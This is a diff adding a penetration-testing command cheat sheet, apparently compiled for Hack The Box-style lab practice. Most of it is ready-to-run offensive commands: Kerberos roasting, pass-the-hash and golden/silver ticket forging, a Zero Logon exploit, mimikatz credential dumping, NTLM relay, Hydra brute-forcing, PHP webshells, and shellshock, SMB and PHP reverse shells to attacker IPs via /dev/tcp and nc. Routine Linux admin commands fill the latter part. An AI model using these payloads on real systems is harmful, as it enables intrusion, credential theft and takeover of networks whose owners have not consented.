@@ -1,0 +1,1258 @@
+# CHEATSHEETS
+
+# ACTIVE DIRECTORY
+
+# ENUMERATE USERS (READ ONLY $IPC)
+
+impacket-lookupsid anonymous@'$IP' # enumerate users
+
+crackmapexec smb $IP -u 'guest' -p '' --rid-brute  # enumerate users
+
+gpp-decrypt PASSWORDHASH    # GPP (GROUP POLICY PREFERENCES/ PASSWORD ATTACKS)
+
+## KERBRUTE
+
+kerbrute userenum --domain <domain> --dc $IP /usr/share/seclists/Usernames/Names/names.txt # kerberos bruteforce
+kerbrute -users users.txt -domain <domain> -dc-ip $IP # kerberos bruteforce
+kerbrute passwordspray -d lab.ropnop.com domain_users.txt Password123   # Password spraying
+
+
+Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>  	# kerberos bruteforce
+
+## ASREPROAST
+
+impacket-GetNPUsers <domain>/ -usersfile <users> -format john -dc-ip $IP # asreproast
+
+Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>	# asreproast
+
+## CRACKING (ASREPROAST)
+
+hashcat -m 18200 --force -a 0 hash /usr/share/wordlists/rockyou.txt # asreproast
+
+# KERBEROASTING
+
+impacket-GetUserSPNs 'domain/user:password' -dc-ip $IP -request # kerberoasting
+
+
+crackmapexec IP/24 -u USER -d DOMAIN -p PASSWD 	# pass the creds
+crackmapexec IP/24 -u "USER" -H HASH --local 	# pass the hash
+crackmapexec smb 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth  # Connect to target using local account
+crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth   # Pass the hash against a subnet
+crackmapexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'   # Pass the hash against a subnet
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --users    # Enumerate users
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups      # Enumerate domain groups
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users  # Enumerate local users
+crackmapexec smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares      # Enumerate available shares
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions     # Get the active sessions
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers       # Check logged in users
+crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol    # Get the password policy
+crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x 'whoami'   # Execute command through cmd.exe (admin privileges required)
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec     # Force the smbexec method
+crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X 'whoami'       # Execute commands through PowerShell (admin privileges required)
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam        # Dump local SAM hashes
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable     # Enable or disable WDigest to get credentials from the LSA Memory # Then you juste have to wait the user logoff and logon again
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable        # Enable or disable WDigest to get credentials from the LSA Memory # Then you juste have to wait the user logoff and logon again
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'quser'    # But you can force the logoff
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'logoff <sessionid>'   # But you can force the logoff
+crackmapexec smb -M mimikatz --module-info      # Module information
+crackmapexec smb -M mimikatz --options      # View module options
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz      # Mimikatz module
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -M mimikatz       # Mimikatz module
+crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'       # Mimikatz module
+crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o LHOST=YOURIP LPORT=4444     # # Met_Inject module
+
+# ZERO LOGON
+
+python3 /home/livestep/tools/CVE-2020-1472/cve-2020-1472-exploit.py ZERO-DC Zero.csl        # zero logon
+
+
+# SILVER TICKET
+
+impacket-ticketer -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name> 	# generate with NTLM SILVER
+impacket-ticketer -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name> 	# generate with AES key SILVER
+export KRB5CCNAME=<TGS_ccache_file> 	# Set the TGSilver for impacket use
+kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname> 	# Silver ticket with mimikatz NTLM
+kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>  # Silver ticket with mimikatz AES 128
+kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>	 Silver ticket with mimikatz AES 256
+kerberos::ptt <ticket_kirbi_file> 	# Inject TICKETS mimikatz
+
+# GOLDEN TICKET
+
+impacket-ticketer -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name> 	# generate with NTLM GOLDEN
+impacket-ticketer -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name> 	# generate with AES key GOLDEN
+kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name> 	# GOLDEN ticket with mimikatz NTLM
+kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> 	#GOLDEN ticket with mimikatz AES 128
+kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> 	#GOLDEN ticket with mimikatz AES 256
+
+# ONE LINERS
+
+## GET NTLM FROM PASSWORD
+
+python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())' 	# GET NTLM FROM PASSWORD oneliner
+
+
+
+# PASS THE TICKET
+
+impacket-getTGT <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash> 	# Request the ticket (TGT) with hash
+impacket-getTGT <domain_name>/<user_name> -aesKey <aes_key> 	# Request the TGT with aesKey
+impacket-getTGT <domain_name>/<user_name>:[password] 	# Request the TGT with password
+sekurlsa::tickets /export 	# mimikatz
+export KRB5CCNAME=<TGT_ccache_file> 	# Set the TGT for impacket use
+
+impacket-psexec <domain_name>/<user_name>@<remote_hostname> -k -no-pass 	# Using Ticket TGT for shell
+impacket-smbexec <domain_name>/<user_name>@<remote_hostname> -k -no-pass 	# Using Ticket TGT for shell
+impacket-wmiexec <domain_name>/<user_name>@<remote_hostname> -k -no-pass 	# Using Ticket TGT for shell
+
+# CRACKING
+
+hashcat -m 13100 --force -a 0 hash /usr/share/wordlists/rockyou.txt # kerberoasting
+hashcat -m 1000 --force -a 0 hash /usr/share/wordlists/rockyou.txt # crack NTLM hash
+
+# CONNECTING
+
+evil-winrm -i $IP -u 'user' -p 'password' # winrm
+evil-winrm -i $IP -u <user> -H <hash> # winrm
+upload local_filename (destination_filename)    # evil-winrm | upload
+download remote_filename (destination_filename) # evil-winrm | download
+services    # evil-winrm  | List all services showing if there your account has permissions over each one
+Powerview.ps1    # evil-winrm | You can load local PS1 scripts just by typing script name
+Invoke-Binary /opt/csharp/Binary.exe 'param1, param2, param3'   # evil-winrm | Allows exes compiled from c# to be executed in memory, The executables must be in the path set at -e argument
+Dll-Loader -http -path http://xx.xx.xx.xx/sharpsploit.dll   # evil-winrm | allows loading dll libraries in memory. The dll file can be hosted by smb, http or locally.
+
+
+impacket-psexec domain/user:password§'$IP' # connect psexec with password
+impacket-psexec user:'$IP' -hashes HASH	# connect psexec with hash
+
+impacket-wmiexec domain/user:password@$IP # Windows connect 
+impacket-smbexec domain/user:password@$IP	# Windows connect
+impacket-atexec.py domain/user:password@IP <command>    # executes a command on the target machine through the Task Scheduler service and returns the output of the executed command. | Windows connect
+impacket-dcomexec.py domain/user:password@IP <command>  # A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints, Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects | Windows connect
+
+# RDP
+xfreerpd /u:user /p:password /v:$IP # connect RDP with creds
+xfreerpd /u:user /v:$IP /pth:hash:hash # connect RDP with hash
+sudo crackmapexec smb 10.69.88.23 -u user -p password -M rdp -o ACTION=enable   # Remotely enable RDP using CrackMapExec
+sekurlsa::pth /user:user /domain:domain.local /ntlm:xxxxxxxxxxxxxxx /run:"mstsc.exe /restrictedadmin"   # # RDP using mimikatz and PtH
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f    # Enable RDP from cmd.exe
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f    # Disable RDP from cmd.exe
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f    # RDP | Disable NLA (Network Layer Authentication) requirement
+netsh firewall set service remoteadmin enable   # RDP | do it through the firewall
+netsh firewall set service remotedesktop enable  # RDP | do it through the firewall
+powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Username\AppData\Local\Temp\sudo_PS1-0.ps1; }"  # RDP | Requires admin privileges or being able to run as sudo (using powershell sudo.ps1)
+
+
+
+# EXTRACT HASHES (MUST BE ADMIN)
+
+crackmapexec smb $IP -u 'user' -p 'password' --ntds # dcsync
+
+impacket-secretsdump domain/user:password@$IP # dcsync
+
+# LLMNR
+
+sudo responder -I * x.x.x.x -w On -r On -f On 	# capturing hashes / llmnr
+sudo responder -I interface -rdwv # capturing hashes / llmnr
+hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force	# cracking NTLMv2
+
+# SMB RELAY ATTACK
+
+impacket-ntlmrelayx -tf targets.txt -smb2support 	# ( if we put -i we can have an interactive shell)(- e execute a payload)(-c "whoami" for execute a command)
+nmap --script smb2-security-mode.nse -p445 $IPS 	# discovering hosts with smb signing
+
+# IPV6 ATTACKS
+
+mitm6 -d domain 	# take over mitm6 ntlm relay
+
+ntlmrelayx.py -6 -t ldaps://MYIP fakewpad.domain -l lootme 	# take over mitm6 ntlmrelay
+
+# UNCONSTRAINED DELEGATION ABUSE
+
+addspn.py -u DOMAIN\\USER -p PASSWORD -s host/FAKESYSTEM.FQDN ldap://DC.FQDN	# can add/remove/modify Service Principal Names (SPN) on accounts in AD over LDAP
+dnstool.py -u DOMAIN\\USERNAME -p PASSWORD -r FAKESYSTEM.FQDN -a add -d YOUR_IP DC_HOSTNAME	# Add/modify/delete Active Directory Integrated DNS records via LDAP
+krbrelayx.py --krbsalt DOMAIN.FQDNUsernameCaseSensitive --krbpass PASSWORD	# Given an account with unconstrained delegation privileges, dump Kerberos TGT's of users connecting to hosts similar to ntlmrelayx
+printerbug.py DOMAIN/USERNAME:PASSWORD@DC_HOSTNAME FAKE_SYSTEM.FQDN	# Simple tool to trigger SpoolService bug via RPC backconnect
+
+# SERVICES
+
+## LDAP
+
+nmap -n -sV --script "ldap* and not brute" -p 389 $IP	# ldap enumeration
+ldapdomaindump 10.10.10.248 -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --no-json --no-grep
+
+# RPC ENUMERATION
+
+rpcclient --user="" --command=enumprivs -N 10.10.10.10      # rpc enumeration
+rpcclient -U "" 10.10.10.10      # rpc enumeration
+rpcclient -U Administrator%Ignite@123 192.168.1.172     # Connect with password   # rpc enumeration
+querydominfo    # Domain Information Query  # rpc enumeration
+enumdomusers    # Enumerating Domain Users  # rpc enumeration
+enumdomgroups   # Enumerating Domain Groups  # rpc enumeration
+querygroup 0x200    # Group Queries  # rpc enumeration
+queryuser yashika   # User Queries  # rpc enumeration
+enumprivs       # Enumerating Privileges  # rpc enumeration
+getdompwinfo       # Get Domain Password Information  # rpc enumeration
+getusrdompwinfo 0x1f4   # Get User Domain Password Information  # rpc enumeration
+lsaenumsid  # Enumerating SID from LSA  # rpc enumeration
+createdomuser hacker        # Creating Domain User step1  # rpc enumeration
+setuserinfo2 hacker 24 Password@1   # Creating Domain User step2  # rpc enumeration
+enumdomusers    # Creating Domain User - confirm step3  # rpc enumeration
+lookupnames hacker  # Lookup Names  # rpc enumeration
+enumalsgroups builtin   # Enumerating Alias Groups  # rpc enumeration
+deletedomuser hacker    # Delete Domain User  # rpc enumeration
+netshareenum        # Net Share Enumeration  # rpc enumeration
+netshareenumall     # Net Share Enumeration  # rpc enumeration
+netsharegetinfo Confidential    # Net Share Get Information  # rpc enumeration
+enumdomains     # Enumerating Domains  # rpc enumeration
+enumdomgroups       # Enumerating Domain Groups  # rpc enumeration
+enumdomusers      # Enumerating Domain Groups  # rpc enumeration
+queryusersgroups 0x44f      # Enumerating Domain Groups  # rpc enumeration
+querygroupmem 0x201      # Enumerating Domain Groups  # rpc enumeration
+querydispinfo       # Display Query Information  # rpc enumeration
+chgpasswd raj Password@1 Password@987   # Change Password of User  # rpc enumeration
+createdomgroup newgroup     # Create Domain Group  # rpc enumeration
+deletedomgroup newgroup     # Delete Domain Group  # rpc enumeration
+lookupdomain ignite     # Domain Lookup  # rpc enumeration
+samlookupnames domain raj       # SAM Lookup  # rpc enumeration
+samlookuprids domain 0x44f      # SAM Lookup  # rpc enumeration
+lsaenumsid      # SID Lookup  # rpc enumeration
+lookupsids S-1-5-32-544     # SID Lookup  # rpc enumeration
+lsaquery        # LSA Query  # rpc enumeration
+dsroledominfo       # LSA Query  # rpc enumeration
+lookupnames raj     # LSA Create Account  # rpc enumeration
+lsacreateaccount S-1-5-21-3232368669-2512470540-2741904768-1103    # LSA Create Account  # rpc enumeration
+lsaenumsid      # Enumerating LSA Group Privileges  # rpc enumeration
+lookupsids S-1-1-0     # Enumerating LSA Group Privileges  # rpc enumeration
+lsaenumprivsaccount S-1-1-0     # Enumerating LSA Group Privileges  # rpc enumeration
+lsaenumacctrights S-1-1-0     # Enumerating LSA Group Privileges  # rpc enumeration
+lookupnames raj     # Enumerating LSA Account Privileges  # rpc enumeration
+lsaaddacctrights S-1-5-21-3232368669-2512470540-2741904768-1103 SeCreateTokenPrivilege     # Enumerating LSA Account Privileges  # rpc enumeration
+lsaenumprivsaccount S-1-5-21-3232368669-2512470540-2741904768-1103     # Enumerating LSA Account Privileges  # rpc enumeration
+lsaremoveacctrights S-1-5-21-3232368669-2512470540-2741904768-1103 SeCreateTokenPrivilege     # Enumerating LSA Account Privileges  # rpc enumeration
+lsaenumprivsaccount S-1-5-21-3232368669-2512470540-2741904768-1103     # Enumerating LSA Account Privileges  # rpc enumeration
+lsalookupprivvalue SeCreateTokenPrivilege     # Enumerating LSA Account Privileges  # rpc enumeration
+lsaquerysecobj      # LSA Query Security Objects  # rpc enumeration
+rpcinfo –p 10.10.10.10      # rpc enumeration  # rpc enumeration  # rpc enumeration
+rpcbind –p 10.10.10.10      # rpc enumeration  # rpc enumeration  # rpc enumeration
+rpcdump.py 10.11.1.121 -p 135       # rpc enumeration  # rpc enumeration  # rpc enumeration
+rpcdump.py 10.11.1.121 -p 135 | grep ncacn_np       # rpc gettin pipes names  # rpc enumeration  # rpc enumeration
+rpcmap.py ncacn_ip_tcp:10.11.1.121[135]     # rpc enumeration  # rpc enumeration
+
+# TIME SYNC
+
+ntpdate -u <IP-of-DC>       # TIME SYNC
+proxychains net time set -S <IP-of-DC>      # TIME SYNC
+
+
+## SMB / SAMBA
+
+enum4linux -a $IP	# full smb enumeration
+smbclient -L //$IP/ -N # list smb shares Null session
+smbclient //10.10.10.10/share_name  # smb connection share
+smbmap -H 10.10.10.10  # smb enumeration
+mount -t cifs "//10.1.1.1/share/" /mnt/wins         # mount share
+mount -t cifs "//10.1.1.1/share/" /mnt/wins -o vers=1.0,user=root,uid=0,gid     # mount share
+smbclient -U "username%password" //192.168.0.116/sharename &!!& smb> logon "/=nc 'attack box ip' 4444 -e /bin/bash"  # smb shell to reverse shell
+
+## NFS
+
+showmount -e $IP	# shows nfs share
+sudo mount -t nfs $IP:/dir ./dir -o nolock	# mount nfs
+
+## SNMP
+
+snmpwalk -c public -v1 10.0.0.0     # snmp enumeration
+snmpcheck -t 192.168.1.X -c public -v1     # snmp enumeration
+onesixtyone -c names -i hosts       # snmp enumeration
+onesixtyone 10.10.10.10 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt  # snmp brute force communities
+nmap -sT -p 161 192.168.X.X -oG snmp_results.txt        # snmp enumeration
+snmpenum -t 192.168.1.X     # snmp enumeration
+
+## REDIS 
+
+redis-cli -h $IP	# login redis
+>AUTH username password # redis if "NOAUTH Authentication required."
+if value is of type string -> GET <key>	# redis
+if value is of type hash -> HGETALL <key>	# redis
+if value is of type lists -> lrange <key> <start> <end>	#redis
+if value is of type sets -> smembers <key>	#redis
+if value is of type sorted sets -> ZRANGEBYSCORE <key> <min> <max>	#redis
+
+
+# WORKING WITH FILES
+
+sed '/^#/d'	# remove the line starting with the caracter #
+sed 's/,/\n/g' 	# Comma to new line
+sed -i '$d' <filename> 	# Remove last line from file
+
+awk '{ print $3, $1 }' file 	# Print Columns 3 and 1 from file
+
+grep -x '.\{8,20\}' > 8-20_length_wordlist 	# grep lenght wordlist
+grep -o '[^ ]*[a-z][^ ]*' > contains_lowercase.txt 	# grep only lowercases
+grep -o '[^ ]*[A-Z][^ ]*' > contains_uppercase.txt 	# grep only uppercases
+grep -o '[^ ]*[0-9][^ ]*' > contains_numbers.txt 	# grep only numbers
+grep -v "^[A-Za-z0-9]*$" > contains_special.txt 	# grep only special characters
+grep -i -r "string" 2>/dev/null		# search recursive the string case insensitive
+grep "^([A-Za-z0–9+/]{4})*([A-Za-z0–9+/]{2}==|[A-Za-z0–9+/]{3}=|[A-Za-z0–9+/]{4})$" 	# grep for Base64 encoded text
+grep -rwl “password” /path/to/search/dir 	# grep string in file
+
+# WEB RELATED
+
+## NODE.JS DESERIALIZATION
+
+nodejsshell.py 10.11.5.72 3333 	# Creates a cookie with a reverse shell (add {"rce":"_$$ND_FUNC$$_function (){OUTPUT}()"})
+
+## SHELLSHOCK
+
+User-Agent: () { :;}; command 		# shellshock command
+User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.119.217/443 0>&1' # shellshock command
+
+## BYPASS FILE UPLOAD
+
+php - phtml, .php, .php3, .php4, .php5, and .inc 	# php bypass file upload
+asp - asp, .aspx	# asp bypass file upload
+perl - .pl, .pm, .cgi, .lib 	# perl bypass file upload
+jsp - .jsp, .jspx, .jsw, .jsv, and .jspf 	# jsp bypass file upload
+Coldfusion - .cfm, .cfml, .cfc, .dbm 	# coldfusion bypass file upload
+
+# USER AGENT RESTRICTION BYPASS
+
+User-Agent: GoogleBot 	# User-agent bypass
+
+# PHP WEBSHELLS
+
+<?php system($_GET["cmd"]) ?> 	# php webshell
+system("sh -i >& /dev/tcp/10.13.37.10/2356 0>&1"); 	# php webshell / revshell / oneliner
+<?php echo shell_exec($_GET['cmd']); ?> 	# php webshell
+<?php echo passthru($_GET['cmd']); ?> 		# php webshell
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.X/8080 0>&1'");?> 	# php webshell / revshell / oneliner
+
+# PHP WRAPPERS
+
+page=php://filter/read=string.rot13/resource=index.php 		# php rot13 wrapper
+page=php://filter/convert.base64-encode/resource=index.php 	# php base64 wrapper
+page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd 	# compression wrapper for large files
+
+page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4= 	# payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>" / php data wrapper
+page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+ 		# php data wrapper / trigger an XSS and bypass the Chrome Auditor
+
+page=expect://id 	# wrapper expect / php / command injection
+
+page=php://input 	# wrapper input / php / Specify your payload in the POST parameters (POST DATA: <?php system('id'); ?>)
+
+
+# WORDPRESS
+
+wpscan --url $IP --enumerate ap,at,cb,dbe 	# wordpress scan
+
+
+# CLOUD
+
+## AWS
+
+aws configure 	# DYNAMODB EXPLOIT
+aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/ --no-sign-request 	# DYNAMODB EXPLOIT
+aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/ --no-sign-request 	# DYNAMODB EXPLOIT
+aws s3 ls --endpoint-url http://s3.bucket.htb --no-sign-request 	# DYNAMODB EXPLOIT
+aws --endpoint-url http://s3.bucket.htb/ s3 ls --recursive --human-readable --summarize s3://adserver 	# DYNAMODB EXPLOIT
+aws --endpoint-url http://s3.bucket.htb/ s3 cp /home/livestep/htb/active/bucket/shell.php s3://adserver/images/shell.php 	# DYNAMODB EXPLOIT
+curl --write-out "%{http_code}\n" --silent --output /dev/null http://s3.bucket.htb/adserver/images/shell.php 	# DYNAMODB EXPLOIT
+
+
+# CRACKING
+
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip 	# crack zip
+pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt 	# crack PDF
+qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf 	#Permanently decrypt pdf file
+
+
+# HYDRA
+
+hydra -L usernames.txt -P pass.txt <IP> mysql 	# MYSQL
+hydra -l root -P passwords.txt [-t 32] <IP> ftp 	# FTP
+hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst s$IP http-get /certsrv/ 	# BASIC AUTH
+hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V 	# HTTP POST-FORM
+hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V 	# IMAP
+hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V 	# IMAP
+hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V 	# POP3
+hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V 	# POP3
+hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres # POSTGRESQL
+hydra -V -f -L <userslist> -P <passwlist> rdp://<IP> 	# RDP
+hydra –P /path/pass.txt <IP> redis 	# REDIS
+hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V 	# REXEC
+hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V 	# RLOGIN
+hydra -L <Username_list> rsh://<Victim_IP> -v -V 	# RSH
+hydra -l root -P passwords.txt <IP> rtsp 	# RTSP
+hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp 	# SNMP
+hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1 	# SMB
+hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V 	# SMTP
+hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL 	 # SMTP
+hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql 	# SQLSERVER //Use the NetBIOS name of the machine as domain\\
+hydra -l root -P passwords.txt [-t 32] <IP> ssh 	# SSH
+hydra -l root -P passwords.txt [-t 32] <IP> telnet 	# TELNET
+hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc 	# VNC
+
+# NORMAL COMMANDS
+
+netstat -tulpn		# Show Linux network ports with process ID's (PIDs)
+watch ss -stplu	# Watch TCP, UDP open ports in real time with socket summary.
+watch ss -tp #  Network communication
+lsof -i		# Show established connections.
+macchanger -m MACADDR INTR 	# Change MAC address on KALI Linux.
+ifconfig eth0 192.168.2.1/24 	# Set IP address in Linux.
+ifconfig eth0:1 192.168.2.3/24 	# Add IP address to existing network interface in Linux.
+ifconfig eth0 hw ether MACADDR 	# Change MAC address in Linux using ifconfig.
+ifconfig eth0 mtu 1500 	# Change MTU size Linux using ifconfig, change 1500 to your desired MTU.
+dig -x 192.168.1.1 	# Dig reverse lookup on an IP address.
+dig www.example.com + short     # dig command
+dig www.example.com MX      # dig command
+dig www.example.com NS      # dig command
+dig www.example.com> SOA        # dig command
+dig www.example.com ANY +noall +answer      # dig command
+dig -x www.example.com      # dig command
+dig -4 www.example.com (For IPv4)       # dig command
+dig -6 www.example.com (For IPv6)       # dig command
+dig www.example.com mx +noall +answer example.com ns +noall +answer     # dig command
+host 192.168.1.1 	# Reverse lookup on an IP address, in case dig is not installed.
+dig @192.168.2.2 domain.com -t AXFR 	# Perform a DNS zone transfer using dig.
+host -l domain.com nameserver 	# Perform a DNS zone transfer using host.
+nbtstat -A x.x.x.x 	# Get hostname for IP address.
+ip addr add 192.168.2.22/24 dev eth0 	# Adds a hidden IP address to Linux, does not show up when performing an ifconfig.
+tcpkill -9 host google.com 	# Blocks access to google.com from the host machine.
+echo "1" > /proc/sys/net/ipv4/ip_forward 	# Enables IP forwarding, turns Linux box into a router - handy for routing traffic through a box.
+echo "8.8.8.8" > /etc/resolv.conf 	# Use Google DNS.
+
+whoami 	# Shows currently logged in user on Linux.
+id 	# Shows currently logged in user and groups for the user.
+last 	# Shows last logged in users.
+mount 	# Show mounted drives.
+df -h 	# Shows disk usage in human readable output.
+echo "user:passwd" | chpasswd 	# Reset password in one line.
+getent passwd 	# List users on Linux.
+strings /usr/local/bin/blah 	# Shows contents of none text files, e.g. whats in a binary.
+uname -ar 	# Shows running kernel version.
+PATH=$PATH:/my/new-path 	# Add a new PATH, handy for local FS manipulation.
+history 	# Show bash history, commands the user has entered previously.
+
+# Redhat / CentOS / RPM Based Distros
+
+cat /etc/redhat-release 	# Shows Redhat / CentOS version number.
+rpm -qa 	# List all installed RPM's on an RPM based Linux distro. redhat /Centos
+rpm -q --changelog openvpn 	# Check installed RPM is patched against CVE, grep the output for CVE. redhat /Centos
+
+# YUM COMMANDS
+
+yum update 	# Update all RPM packages with YUM, also shows whats out of date.
+yum update httpd 	# Update individual packages, in this example HTTPD (Apache).
+yum install package 	# Install a package using YUM.
+yum --exclude=package kernel* update 	# Exclude a package from being updates with YUM.
+yum remove package 	# Remove package with YUM.
+yum erase package 	# Remove package with YUM.
+yum list package 	# Lists info about yum package.
+yum provides httpd 	# What a packages does, e.g Apache HTTPD Server.
+yum info httpd 	# Shows package info, architecture, version etc.
+yum localinstall blah.rpm 	# Use YUM to install local RPM, settles deps from repo.
+yum deplist package 	# Shows deps for a package.
+yum list installed | more 	# List all installed packages.
+yum grouplist | more 	# Show all YUM groups.
+yum groupinstall 'Development Tools' 	# Install YUM group.
+
+
+# DEBIAN
+
+cat /etc/debian_version 	# Shows Debian version number.
+cat /etc/*-release 	# Shows Ubuntu version number.DEBIAN
+dpkg -l 	# List all installed packages on Debian / .deb based Linux distro.
+
+# USER MANAGEMENT
+
+useradd new-user 	# Creates a new Linux user.
+passwd username 	# Reset Linux user password, enter just passwd if you are root.
+deluser username 	# Remove a Linux user.
+
+# DECOMPRESSION COMMANDS
+
+unzip archive.zip 	# Extracts zip file on Linux.
+zipgrep *.txt archive.zip 	# Search inside a .zip archive.
+tar xf archive.tar 	# Extract tar file Linux.
+tar xvzf archive.tar.gz 	# Extract a tar.gz file Linux.
+tar xjf archive.tar.bz2 # Extract a tar.bz2 file Linux.
+tar ztvf file.tar.gz | grep blah 	# Search inside a tar.gz file.
+gzip -d archive.gz 	# Extract a gzip file Linux.
+zcat archive.gz 	# Read a gz file Linux without decompressing.
+zless archive.gz 	# Same function as the less command for .gz archives.
+zgrep 'blah' /var/log/maillog*.gz 	# Search inside .gz archives on Linux, search inside of compressed log files.
+vim file.txt.gz 	# Use vim to read .txt.gz files
+upx -9 -o output.exe input.exe 	# UPX compress .exe file Linux.
+
+# COMPRESSION COMMANDS
+
+zip -r file.zip /dir/* 		# Creates a .zip file on Linux.
+tar cf archive.tar files 	# Creates a tar file on Linux.
+tar czf archive.tar.gz files 	# Creates a tar.gz file on Linux.
+tar cjf archive.tar.bz2 files 	# Creates a tar.bz2 file on Linux.
+gzip file 	# Creates a file.gz file on Linux.
+
+# LINUX FILE COMMANDS
+
+df -h blah 	# Display size of file / dir Linux.
+diff file1 file2 	# Compare / Show differences between two files on Linux.
+md5sum file 	# Generate MD5SUM Linux.
+md5sum -c blah.iso.md5 	# Check file against MD5SUM on Linux, assuming both file and .md5 are in the same dir.
+file blah 	# Find out the type of file on Linux, also displays if file is 32 or 64 bit.
+dos2unix 	# Convert Windows line endings to Unix / Linux.
+base64 < input-file > output-file 	# Base64 encodes input file and outputs a Base64 encoded file called output-file.
+base64 -d < input-file > output-file 	# Base64 decodes input file and outputs a Base64 decoded file called output-file.
+touch -r ref-file new-file 	# Creates a new file using the timestamp data from the reference file, drop the -r to simply create a file.
+rm -rf 	# Remove files and directories without prompting for confirmation.
+for i in $(cat passw.txt); do echo $i; echo ${i}2019; echo ${i}2020; done 	# add word loop / oneliner
+
+# MISC COMMANDS
+
+init 6 	# Reboot Linux from the command line.
+gcc -o output.c input.c 	# Compile C code.
